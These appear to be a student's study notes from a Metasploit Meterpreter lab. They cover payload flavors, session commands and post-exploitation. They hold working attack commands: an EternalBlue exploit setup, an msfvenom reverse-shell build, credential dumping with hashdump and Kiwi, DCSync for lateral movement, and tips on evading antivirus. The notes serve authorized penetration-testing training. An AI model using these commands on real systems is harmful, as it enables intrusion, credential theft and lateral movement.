# Metasploit Meterpreter


## Introduction To Metasploit

### Concepts Learned
- Meterpreter as a Metasploit payload and its purpose in penetration testing.
- How Meterpreter operates (in-memory, no disk footprint).
- Evasion techniques against AV, IDS/IPS.
- Process identification and stealth behavior.
- Use of getpid and ps to verify running processes.
- Encrypted communication with the attacker’s machine.

### Explanation
- Meterpreter runs as a payload on the target system, providing powerful control and post-exploitation functionality.
- It does not write to disk; instead, it runs directly in memory, making it stealthier against antivirus software that scans files.
- Uses TLS-encrypted communication with the attacker’s system, helping evade network-based IDS/IPS if traffic is not inspected.
- Appears as a legitimate process (e.g., spoolsv.exe) rather than meterpreter.exe.
- Even DLL inspection (tasklist /m /fi "pid eq <PID>") may not reveal anything obvious linking to Meterpreter.
- While stealthy, modern antivirus solutions can still detect Meterpreter.

### Notes
**Get Process ID:**
  - meterpreter > getpid
  - Current pid: 1304
**List processes:**
  - meterpreter > ps
  - Example: PID 1304 shows as spoolsv.exe.
  - Check loaded modules for PID:
  - tasklist /m /fi "pid eq 1304"
**Communication:**
  - Meterpreter uses encrypted (TLS) channels to communicate with the attacker.


## Meterpreter Flavors

### Concepts learned
- Meterpreter exists in staged (stager + stage) and stageless/inline variants.
- Multiple platform builds: Windows, Linux, macOS, Android, iOS, Java, PHP, Python, etc.
- Choice of flavor depends on target OS, available interpreters/components (PHP/Python/Java), and network constraints (raw TCP, HTTP(S), IPv6).
- Exploits may set a default Meterpreter payload but show payloads reveals alternatives you can choose.

### Explanation
- Staged Meterpreter: small stager runs first, then downloads a larger stage — reduces initial payload size and can be useful when network fetch is allowed.
- Stageless/Inline Meterpreter: entire payload delivered at once (no second-stage fetch) — simpler delivery but larger initial payload.
- Platform-specific builds let you pick the best transport/protocol (e.g., reverse_tcp, reverse_http, reverse_https, bind_tcp) to bypass networking restrictions.
- When using msfvenom you can list available Meterpreter variants and generate the exact flavor needed for your target and delivery mechanism.
- If an exploit selects a default Meterpreter, you can still override it with set PAYLOAD <name> (match arch/OS and staged vs inline).

### Notes
**List Meterpreter payloads:**
  - msfvenom --list payloads | grep meterpreter
-Common Meterpreter transports: reverse_tcp, reverse_http, reverse_https, bind_tcp, bind_named_pipe.
**Pick payload inside module:**
  - use exploit/windows/smb/ms17_010_eternalblue
  - show payloads
  - set PAYLOAD windows/x64/meterpreter/reverse_tcp
  - show options  # verify LHOST/LPORT appear
  - set LHOST 10.10.44.70
  - set LPORT 4444
  - exploit
**Generate standalone Meterpreter with msfvenom (example Windows exe):**
  - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
  - Generate stageless/stage choice via payload name: use _reverse_tcp vs _reverse_tcp variants that include _reverse_* naming; check msfvenom list to confirm staged vs stageless.
  - If network only allows HTTPS/HTTP, choose meterpreter_reverse_https or meterpreter_reverse_http.
  - If target has a language runtime (PHP/Python/Java), prefer language-specific Meterpreter payloads (e.g., php/meterpreter_reverse_tcp) for easier execution.
  - When changing payloads, always show options afterwards — payloads add required params (LHOST/LPORT) you must set.


## Meterpreter Commands

### Concepts learned
- help in a Meterpreter session lists available commands and categories.
- Commands are grouped by purpose (core, filesystem, networking, system, UI/media, elevate, passwords, timestomp, scripting).
- Meterpreter commands run in memory (no disk files) and vary by Meterpreter flavor and target capabilities.
- Not all categories/commands will work on every target (depends on OS, runtime, hardware).

### Explanation
- Core — session management and control (background, migrate, run scripts, load extensions).
- Filesystem — browse, upload/download, edit and search files on the target.
- Networking — inspect interfaces/connections, forward ports, modify routing.
- System — process and service control, execute shell commands, reboot/shutdown, privilege escalation attempts.
- UI / Media — capture screenshots, webcam, microphone, and interactive screen sharing (if supported).
- Elevation / Credentials — privilege escalation helpers and credential extraction interfaces (hashdump, extensions like Kiwi/mimikatz).
- Timestomp & Forensics — timestamp/file attribute manipulation and forensic-related utilities.
- Scripting / Extensions — run Meterpreter scripts, background scripts, or use the Ruby/IRB REPL for advanced tasks.

### Notes
- Run help in-session to view the exact command set for that Meterpreter build.
- Use load <extension> to enable advanced credential or forensic features (e.g., Kiwi).
- Test hardware-dependent features (webcam, mic) in a lab — they may not exist on every host.
- Combine Meterpreter help with msfconsole info/show options when planning post-exploitation tasks.


## Meterpreter Post Exploitation

### Concepts learned
- Meterpreter is rich for post-exploitation: session management, host enumeration, file access, credential dumping, persistence, and user monitoring.
- Key post-exploitation tasks: identify privileges (getuid), inspect processes (ps), migrate to stable processes, dump credentials (hashdump), search for sensitive files, and drop to an interactive shell.
- Migrating processes can improve stability or enable keylogging, but may change privilege level.
- hashdump exposes NTLM hashes usable for offline cracking or pass-the-hash attacks (sensitive handling required).
- search speeds discovery of target files (flags, configs, creds).
- shell provides a native OS command shell when needed; background / CTRL+Z returns to Meterpreter.

### Explanation
- After gaining a session, first establish your privilege and stability: run getuid to see the account, sysinfo for OS details, and ps to view processes and candidate targets for migration.
- Migrate into a stable or privileged process (e.g., svchost.exe) to increase session reliability or access user contexts — beware migrating from higher → lower privilege may lose capabilities.
- Extract credentials with hashdump on Windows (requires privileges) to collect NTLM hashes for offline cracking or lateral movement. Treat hashes as sensitive data.
- Use file search (search -f <name> or pattern) to quickly locate proof files, config files, or credentials for escalation.
- Use shell for actions needing a full system shell (scripting, running binaries) and return to Meterpreter with background/CTRL+Z to keep the session active.
- Always validate available commands with help, and prefer Meterpreter built-ins for stealthier in-memory operations when possible.

### Notes
**Check current user & system:**
  - meterpreter > getuid
  - meterpreter > sysinfo
**List processes (find PID to migrate to):**
  - meterpreter > ps
**Migrate to another process (use PID):**
  - meterpreter > migrate 716
- Tip: migrate to a long-running, stable process; avoid dropping privileges.
**Dump Windows account hashes (requires appropriate privileges):**
  - meterpreter > hashdump
- Handle output securely; use offline cracking or pass-the-hash carefully and ethically.
**Search for files (example: find a flag or config):**
  - meterpreter > search -f flag2.txt
**Drop to an interactive shell and return:**
  - meterpreter > shell
# to return to meterpreter: CTRL+Z then confirm background
**Session management (background session from meterpreter):**
  - meterpreter > background
**Practical cautions:**
  - Verify privileges before hashdump or other destructive actions.
  - Test migrations in a lab to avoid losing access.
  - Log actions (module, options, session id) for reproducibility and reporting.


## Post Exploitation Challenge

### Concepts learned
- Post-exploitation goals: gather intel, escalate privileges, move laterally, and extract sensitive artifacts.
- Meterpreter can load extensions (e.g., python, kiwi) to run extra tooling in-session.
- Loaded extensions expose new commands (Kiwi→mimikatz-like creds, Python→execute scripts).
- getsystem, hashdump, and Kiwi commands enable credential access and domain enumeration for escalation/relaying.
- Use Meterpreter as a staging point to run post modules, extract files, and pivot to other hosts.

### Explanation
- Post-exploitation is about maximizing the value of a foothold: enumerate the host, collect credentials, persist, and expand access.
- load <extension> augments Meterpreter with powerful capabilities without writing files to disk (e.g., load python to run scripts, load kiwi to access Windows credential APIs).
- Credential material (SAM/LSASS/DCSync outputs) can be used for offline cracking, pass-the-hash, or DCSync to replicate AD data — treat outputs as highly sensitive.
- Use Meterpreter built-ins first (getuid, ps, search, shell) to map immediate opportunities, then load extensions for deeper extraction and domain operations.
- Maintain operational caution: avoid noisy or destructive actions on production targets; prefer safe enumeration (help, info) and backups in lab.

### Notes
**Load Python extension and run quick script:**
  - meterpreter > load python
  - meterpreter > python_execute "print 'TryHackMe Rocks!'"
**Local post-exploitation primitives:**
  - meterpreter > getuid
  - meterpreter > ps
  - meterpreter > migrate <pid>
  - meterpreter > hashdump
  - meterpreter > search -f <filename>
  - meterpreter > shell      # drop to OS shell
**Use Meterpreter to pivot / enumerate shares and services, then run post modules from msfconsole or meterpreter run:**
  - meterpreter > run post/windows/gather/enum_shares
**Handling discovered secrets:**
- Treat NTLM hashes and plaintext credentials as sensitive; use hashdump, creds_*, or dcsync outputs for lateral movement or offline analysis.
**Practical reminders:**
- Always run help after loading an extension to learn available commands.
- Test Kiwi and Python features in a lab; some commands require SYSTEM privileges.
- Record the sequence: which extension was loaded, exact commands run, session ID, and artifacts collected for reporting and reproducibility.


## Keytakeaways
- Metasploit is modular: know module types (exploit, auxiliary, payload, encoder, evasion, nops, post) and how to navigate them.
- msfconsole is the primary interface — always check the prompt to confirm context before running module-specific commands.
- Standard workflow: use <module> → info → show options → set/setg → show payloads → set PAYLOAD → exploit/run.
- Use setg for values you want persistent (LHOST, common RHOSTS); clear with unset / unset all / unsetg.
- Prefer check when available to safely probe for vulnerability before exploiting.
- Match payload to target constraints: OS/arch, staged vs stageless, transport (tcp/http/https), and available runtimes (PHP/Python/Java).
- msfvenom builds custom payloads in many formats (exe, elf, php, asp, raw); always set the same LHOST/LPORT in your handler (exploit/multi/handler).
- Use exploit -z to launch and immediately background new sessions so you can continue working.
- Manage sessions effectively: sessions (list), sessions -i <id> (interact), background / CTRL+Z (background), sessions -k (kill), sessions -u (upgrade).
- Use Metasploit DB + workspaces (msfdb init, db_nmap, hosts, services) to organize engagements and import Nmap results for repeatable workflows.
- Auxiliary scanners are great for quick in-console discovery; use Nmap (db_nmap or exec: nmap) for comprehensive scans and NSE scripts.
- Post-exploitation with Meterpreter: prefer in-memory built-ins for stealth (file ops, process mgmt, migration, portfwd, search, shell) and load extensions (Kiwi, Python) when needed.
- Handle credentials & artifacts carefully: hashdump, creds_*, dcsync outputs are sensitive — use them for lateral movement or offline analysis and document provenance.
- Test encoders/evasion and payload delivery in a lab; they are not guaranteed AV/IDS bypasses.
- Record everything for reproducibility: workspace, module path, options set, payload used, msfvenom commands, session IDs, and artifacts collected.
- Ethics & safety: perform hands-on testing only in authorized labs or with explicit permission; avoid destructive actions on production systems.
- Hands-on: I completed practical exercises in the lab — ran scans, generated payloads with msfvenom, started handlers, loaded Meterpreter sessions, used post-exploitation extensions (Python/Kiwi), and practiced session management.
